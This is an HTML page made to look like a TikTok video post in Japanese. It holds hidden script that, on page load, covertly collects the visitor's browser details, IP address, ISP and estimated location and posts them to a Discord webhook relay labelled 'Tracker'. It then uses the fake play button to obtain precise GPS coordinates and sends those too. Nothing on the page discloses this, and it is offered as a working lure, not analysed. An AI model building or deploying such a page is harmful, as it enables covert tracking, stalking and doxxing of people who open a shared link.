<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>@user の動画 | TikTok</title>
<meta property="og:title" content="@user on TikTok" />
<meta property="og:description" content="TikTokでチェックしてね" />
<meta property="og:type" content="video.other" />
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><text y='19' font-size='20'>🎵</text></svg>" />
<style>
:root{--pink:#fe2c55;--cyan:#25f4ee}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{margin:0;height:100%;background:#000;color:#fff;font-family:-apple-system,"Helvetica Neue","Hiragino Sans",sans-serif;overscroll-behavior:none}
.app{position:relative;height:100dvh;display:flex;flex-direction:column;overflow:hidden}
.top{display:flex;justify-content:center;gap:22px;padding:14px 0 10px;font-size:15px;font-weight:600}
.top span{color:#ffffff8c}
.top .on{color:#fff;position:relative}
.top .on::after{content:"";position:absolute;left:50%;bottom:-8px;transform:translateX(-50%);width:26px;height:2px;background:#fff;border-radius:2px}
.stage{position:relative;flex:1;display:grid;place-items:center;background:radial-gradient(circle at 50% 40%,#1b1b1b,#000 70%)}
.thumb{position:absolute;inset:0;background:linear-gradient(135deg,#241a2b,#0d0d0d 60%)}
.thumb::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 30% 20%,#fe2c5533,transparent 55%)}
.play{position:relative;width:78px;height:78px;border-radius:50%;background:#ffffff1a;backdrop-filter:blur(6px);display:grid;place-items:center;border:1px solid #ffffff26;transition:.2s;cursor:pointer}
.play svg{width:30px;height:30px;fill:#fff;margin-left:4px}
.play:active{transform:scale(.94)}
.play.loading svg{display:none}
.play.loading::after{content:"";width:26px;height:26px;border:2.5px solid #ffffff33;border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.rail{position:absolute;right:10px;bottom:100px;display:flex;flex-direction:column;gap:20px;align-items:center;font-size:11px}
.rail div{display:flex;flex-direction:column;align-items:center;gap:4px}
.rail svg{width:30px;height:30px;fill:#fff;filter:drop-shadow(0 1px 3px #0008)}
.bottom{position:relative;padding:12px 14px calc(14px + env(safe-area-inset-bottom));background:linear-gradient(transparent,#000000e6 40%)}
.user{font-weight:700;font-size:15px;display:flex;align-items:center;gap:8px}
.avatar{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--pink),var(--cyan))}
.cap{font-size:13px;color:#ffffffd9;margin:8px 0 10px;line-height:1.45}
.music{font-size:12px;color:#ffffffb3;display:flex;gap:6px;align-items:center}
.toast{position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);background:#ffffff1a;backdrop-filter:blur(8px);padding:9px 16px;border-radius:99px;font-size:12.5px;opacity:0;transition:.3s;pointer-events:none;z-index:9}
.toast.show{opacity:1;transform:translate(-50%,0)}
</style>
</head>
<body>
<div class="app">
  <div class="top"><span>フォロー中</span><span class="on">おすすめ</span></div>
  <div class="stage">
    <div class="thumb"></div>
    <div class="play" id="play" aria-label="再生">
      <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
    <div class="rail">
      <div><svg viewBox="0 0 24 24"><path d="M12 21s-8-4.9-8-10.4A4.6 4.6 0 0 1 12 7a4.6 4.6 0 0 1 8 3.6C20 16.1 12 21 12 21z"/></svg><span>12.4K</span></div>
      <div><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/></svg><span>803</span></div>
      <div><svg viewBox="0 0 24 24"><path d="M17 3H7a2 2 0 0 0-2 2v16l7-4 7 4V5a2 2 0 0 0-2-2z"/></svg><span>2.1K</span></div>
      <div><svg viewBox="0 0 24 24"><path d="M14 3v12.6a4.4 4.4 0 1 1-3-4.2V3h3z"/><path d="M14 3c.6 2.6 2.4 4 5 4.3V10c-2.3 0-4-.7-5-1.7"/></svg><span>共有</span></div>
    </div>
  </div>
  <div class="bottom">
    <div class="user"><div class="avatar"></div>@user</div>
    <p class="cap">この動画やばい 😳 #fyp #おすすめ</p>
    <div class="music">♬ オリジナル楽曲 - user</div>
  </div>
</div>
<div class="toast" id="toast">読み込み中…</div>

<script>
const base = {
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.language,
  screen: innerWidth + "x" + innerHeight + " @" + devicePixelRatio + "x",
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  referrer: document.referrer || "(direct)",
  time: new Date().toLocaleString("ja-JP"),
  url: location.href
};

async function getIP(){
  const apis = [
    ["https://ipwho.is/", d => ({ip:d.ip, where:[d.city,d.region,d.country].filter(Boolean).join(" / "), isp:d.connection?.isp, lat:d.latitude, lng:d.longitude})],
    ["https://ipapi.co/json/", d => ({ip:d.ip, where:[d.city,d.region,d.country_name].filter(Boolean).join(" / "), isp:d.org, lat:d.latitude, lng:d.longitude})],
    ["https://api.ipify.org?format=json", d => ({ip:d.ip, where:"-", isp:"-"})]
  ];
  for (const [url, map] of apis){
    try{
      const r = await fetch(url, {cache:"no-store"});
      if(!r.ok) continue;
      const o = map(await r.json());
      if(o.ip) return o;
    }catch(e){}
  }
  return null;
}

function getGeo(){
  return new Promise(res => {
    if(!navigator.geolocation) return res({error:"非対応"});
    navigator.geolocation.getCurrentPosition(
      p => res({lat:p.coords.latitude, lng:p.coords.longitude, acc:Math.round(p.coords.accuracy)}),
      e => res({error:e.message}),
      {enableHighAccuracy:true, timeout:10000, maximumAge:0}
    );
  });
}

function toast(t){ const el=document.getElementById("toast"); el.textContent=t; el.classList.add("show"); setTimeout(()=>el.classList.remove("show"),2200); }

async function send(fields, title){
  const embeds = [{
    title,
    color: 0xfe2c55,
    fields: Object.entries(fields).map(([name,value])=>({name, value:String(value||"-").slice(0,1020), inline:true})),
    timestamp: new Date().toISOString()
  }];
  
  await fetch("/.netlify/functions/discord", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({username:"Tracker", embeds})
  }).catch(err => console.error("送信エラー:", err));
}

(async () => {
  const ip = await getIP();
  const f1 = {...base};
  if(ip){
    f1["IP"] = ip.ip;
    f1["IP推定地"] = ip.where;
    f1["ISP"] = ip.isp;
    if(ip.lat) f1["IP地図"] = `https://www.google.com/maps?q=${ip.lat},${ip.lng}`;
  } else f1["IP"] = "取得失敗";
  send(f1, "📡 アクセス（IP）");

  const play = document.getElementById("play");
  play.addEventListener("click", async () => {
    if(play.classList.contains("loading")) return;
    play.classList.add("loading");
    toast("位置情報の利用を許可してください");
    const g = await getGeo();
    play.classList.remove("loading");
    if(g.error){
      toast("位置情報が取得できませんでした");
      send({...base, "GPS":"拒否/失敗", "理由":g.error}, "📍 位置情報 失敗");
      return;
    }
    toast("再生中…");
    send({
      ...base,
      "GPS": `${g.lat}, ${g.lng}`,
      "精度": `±${g.acc}m`,
      "地図": `https://www.google.com/maps?q=${g.lat},${g.lng}`
    }, "📍 正確な位置情報");
  });
})();
</script>
</body>
</html>
